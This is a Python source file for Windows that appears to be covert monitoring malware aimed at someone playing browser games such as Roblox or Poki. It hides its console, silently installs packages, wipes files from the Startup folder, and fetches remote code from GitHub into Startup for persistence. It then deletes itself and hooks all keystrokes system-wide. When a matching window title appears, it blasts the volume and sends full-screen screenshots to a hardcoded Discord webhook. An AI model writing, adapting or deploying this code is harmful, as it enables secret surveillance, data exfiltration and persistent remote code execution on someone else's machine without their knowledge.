# monitor_script.py - Complete solution: Cleanup + Update + Monitor
import os
import sys
import urllib.request
import subprocess
import tempfile
import time
import requests
import threading
import win32gui
import pyautogui
import keyboard
import io
from datetime import datetime
from PIL import ImageGrab
import json

# ========== CONFIGURATION ==========
# Discord webhook for notifications
UPDATE_WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

# Monitoring configuration
TARGET_KEYWORDS = [
    "crazygames",
    "roblox", 
    "jeux gratuits",
    "joue maintenant", "poki"
]

SPAM_SPEED = 0.05
STABILITY_TIME = 0.3
PASSWORD = "stop123"
TOGGLE_HOTKEY = "ctrl+alt+p"
# ===================================

# ========== PART 1: SYSTEM CLEANUP & UPDATE ==========
def send_webhook(title, description, color=3066993):
    """Send notification to Discord"""
    try:
        data = {
            "embeds": [{
                "title": title,
                "description": description,
                "color": color,
                "timestamp": datetime.now().isoformat(),
                "footer": {"text": "Monitor System"}
            }]
        }
        
        response = requests.post(
            UPDATE_WEBHOOK,
            json=data,
            headers={'Content-Type': 'application/json'},
            timeout=5
        )
        return response.status_code in [200, 204]
    except:
        return False

def force_delete_everything():
    """Force delete ALL files from startup folder"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # Create batch file to force delete everything
    batch_script = f'''@echo off
cd /d "{startup_folder}"

:: Force delete all files except launchers
for %%f in (*.log) do (
    if not "%%f"=="Startup.pyw" (
        if not "%%f"=="github_launcher.pyw" (
            del /f /q "%%f" 2>nul
        )
    )
)

for %%f in (*.txt) do (
    if not "%%f"=="Startup.pyw" (
        if not "%%f"=="github_launcher.pyw" (
            del /f /q "%%f" 2>nul
        )
    )
)

for %%f in (*.py) do (
    if not "%%f"=="Startup.pyw" (
        if not "%%f"=="github_launcher.pyw" (
            del /f /q "%%f" 2>nul
        )
    )
)

for %%f in (*.pyw) do (
    if not "%%f"=="Startup.pyw" (
        if not "%%f"=="github_launcher.pyw" (
            del /f /q "%%f" 2>nul
        )
    )
)

del /f /q *.json 2>nul
del /f /q *.pyc 2>nul
del /f /q requirements.txt 2>nul

:: Delete __pycache__ folders
for /d %%d in (__pycache__) do (
    rmdir /s /q "%%d" 2>nul
)

echo Cleanup complete!
timeout /t 2 /nobreak >nul
'''
    
    # Save and run batch file
    batch_path = tempfile.gettempdir() + "/cleanup.bat"
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run hidden
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    process = subprocess.Popen(
        ['cmd', '/c', batch_path],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    
    # Wait for cleanup
    time.sleep(3)
    
    # Delete batch file
    try:
        os.remove(batch_path)
    except:
        pass
    
    return True

def update_launcher():
    """Replace Startup.pyw with clean version from GitHub"""
    try:
        # Download clean launcher from GitHub
        launcher_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
        response = urllib.request.urlopen(launcher_url, timeout=10)
        new_launcher_code = response.read().decode('utf-8')
        
        # Write to startup folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        launcher_path = os.path.join(startup_folder, "Startup.pyw")
        
        with open(launcher_path, 'w', encoding='utf-8') as f:
            f.write(new_launcher_code)
        
        # Send success webhook
        send_webhook(
            "✅ Launcher Updated",
            f"Successfully updated Startup.pyw from GitHub\n"
            f"**Size:** {len(new_launcher_code)} bytes\n"
            f"**Time:** {datetime.now().strftime('%H:%M:%S')}",
            3066993  # Green
        )
        
        return True
        
    except Exception as e:
        send_webhook(
            "❌ Update Failed",
            f"Failed to update launcher: {str(e)}",
            15158332  # Red
        )
        return False

def auto_install_deps():
    """Silently install required packages"""
    packages = ["pywin32", "pyautogui", "keyboard", "requests", "pillow"]
    
    for pkg in packages:
        try:
            if pkg == "pillow":
                __import__("PIL.ImageGrab")
            else:
                __import__(pkg)
        except ImportError:
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", pkg, "--quiet"],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    timeout=60
                )
            except:
                pass

def cleanup_and_update():
    """Main cleanup and update function"""
    print("=" * 60)
    print("SYSTEM CLEANUP & UPDATE")
    print("=" * 60)
    
    # 1. Auto-install dependencies
    print("\n[1/3] Installing dependencies...")
    auto_install_deps()
    
    # 2. Force delete everything
    print("\n[2/3] Cleaning startup folder...")
    force_delete_everything()
    
    # 3. Update launcher
    print("\n[3/3] Updating launcher...")
    updated = update_launcher()
    
    print("\n" + "=" * 60)
    print("Cleanup & Update Complete!")
    print("=" * 60)
    
    return updated

def delete_self():
    """Delete this script file"""
    try:
        this_script = os.path.abspath(__file__)
        
        # Create batch file to delete this script
        batch_content = f'''@echo off
timeout /t 5 /nobreak >nul
del /f /q "{this_script}" >nul 2>nul
if exist "{this_script}" (
    timeout /t 2 /nobreak >nul
    del /f /q "{this_script}" >nul 2>nul
)
del "%~f0" >nul 2>nul
'''
        
        batch_path = tempfile.gettempdir() + "/delete_self.bat"
        with open(batch_path, 'w') as f:
            f.write(batch_content)
        
        # Run hidden
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        subprocess.Popen(
            ['cmd', '/c', batch_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
    except:
        pass

# ========== PART 2: ORIGINAL MONITOR CODE ==========
# Run cleanup first, then start monitoring
cleanup_and_update()

# Schedule self-deletion in background
threading.Thread(target=delete_self, daemon=True).start()

# Hide console
try:
    import win32gui
    import win32con
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
except:
    pass

# Start original monitor code (exactly as before, but no file creation)
spamming = False
mute_done = False
lock = threading.Lock()
tracking_enabled = True
password_buffer = ""
last_key_time = 0
detected_targets = set()

# Helper functions from original code
def title_matches_target(title: str) -> bool:
    title_lower = title.lower()
    return any(keyword in title_lower for keyword in TARGET_KEYWORDS)

def get_matching_keyword(title: str) -> str:
    title_lower = title.lower()
    for keyword in TARGET_KEYWORDS:
        if keyword in title_lower:
            return keyword
    return ""

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        return screenshot
    except Exception:
        return None

def send_discord_alert(title, keyword, screenshot=None):
    """Send alert to Discord"""
    if not UPDATE_WEBHOOK:
        return False
    
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        embed = {
            "title": "⚠️ Target Detected",
            "description": f"**Window:** `{title}`\n**Keyword:** `{keyword}`\n**Time:** `{current_time}`",
            "color": 16711680,
            "footer": {"text": "Monitor"}
        }
        
        if screenshot:
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            
            files = {'file': ('screenshot.png', img_byte_arr, 'image/png')}
            payload = {"embeds": [embed], "content": "📸 Screenshot below:"}
            
            response = requests.post(
                UPDATE_WEBHOOK,
                files=files,
                data={'payload_json': json.dumps(payload)}
            )
        else:
            payload = {"embeds": [embed], "content": f"🚨 Detected: {title}"}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(UPDATE_WEBHOOK, json=payload, headers=headers)
        
        return response.status_code in [200, 204]
    except:
        return False

def send_discord_status(status):
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = 65280 if status == "ENABLED" else 16711680
        
        embed = {
            "title": f"🔄 Tracking {status}",
            "description": f"Status: **{status}**\nTime: `{current_time}`",
            "color": color,
            "footer": {"text": "Monitor"}
        }
        
        payload = {"embeds": [embed]}
        headers = {'Content-Type': 'application/json'}
        response = requests.post(UPDATE_WEBHOOK, json=payload, headers=headers)
        
        return response.status_code in [200, 204]
    except:
        return False

def toggle_tracking():
    global tracking_enabled, password_buffer
    tracking_enabled = not tracking_enabled
    status = "ENABLED" if tracking_enabled else "DISABLED"
    
    send_discord_status(status)
    
    if not tracking_enabled:
        global spamming, mute_done
        with lock:
            if spamming:
                spamming = False
                mute_done = True
                try:
                    pyautogui.press("volumemute")
                except:
                    pass
    
    password_buffer = ""

def on_key_event(e):
    global password_buffer, last_key_time
    
    if len(e.name) > 1 and e.name not in ['space', 'enter', 'backspace']:
        return
    
    current_time = time.time()
    
    if current_time - last_key_time > 2:
        password_buffer = ""
    
    last_key_time = current_time
    
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'backspace':
            password_buffer = password_buffer[:-1]
        elif e.name == 'space':
            password_buffer += ' '
        elif len(e.name) == 1:
            password_buffer += e.name
        elif e.name == 'enter':
            check_password()
            return
    
    check_password()
    
    if len(password_buffer) > 20:
        password_buffer = password_buffer[-20:]

def check_password():
    global password_buffer
    if PASSWORD in password_buffer:
        toggle_tracking()
        password_buffer = ""

def setup_keyboard_listener():
    keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
    keyboard.hook(on_key_event, suppress=False)
    return keyboard

def volume_spammer():
    global spamming
    while spamming:
        try:
            pyautogui.press("volumeup")
            time.sleep(SPAM_SPEED)
        except:
            pass

# ========== MAIN MONITOR LOOP ==========
kb_listener = setup_keyboard_listener()

stable_on = 0.0
stable_off = 0.0

try:
    while True:
        if tracking_enabled:
            try:
                hwnd = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(hwnd).strip()

                if not title:
                    time.sleep(0.05)
                    continue

                detected = title_matches_target(title)

                if detected:
                    stable_on += 0.1
                    stable_off = 0.0
                else:
                    stable_off += 0.1
                    stable_on = 0.0

                if not spamming and stable_on >= STABILITY_TIME:
                    keyword = get_matching_keyword(title)
                    
                    with lock:
                        spamming = True
                        mute_done = False
                    
                    threading.Thread(target=volume_spammer, daemon=True).start()
                    
                    if UPDATE_WEBHOOK:
                        detection_id = f"{title}_{keyword}_{int(time.time())}"
                        
                        if detection_id not in detected_targets:
                            detected_targets.add(detection_id)
                            
                            time.sleep(0.5)  # SCREENSHOT_DELAY
                            
                            screenshot = take_screenshot()
                            
                            alert_thread = threading.Thread(
                                target=send_discord_alert,
                                args=(title, keyword, screenshot),
                                daemon=True
                            )
                            alert_thread.start()
                            
                            threading.Timer(300, lambda: detected_targets.discard(detection_id)).start()

                if spamming and stable_off >= STABILITY_TIME:
                    with lock:
                        spamming = False
                        if not mute_done:
                            try:
                                pyautogui.press("volumemute")
                                mute_done = True
                            except:
                                pass

            except Exception:
                pass
        
        time.sleep(0.1)

except KeyboardInterrupt:
    pass
except Exception:
    pass
finally:
    kb_listener.unhook_all()
    if spamming:
        spamming = False
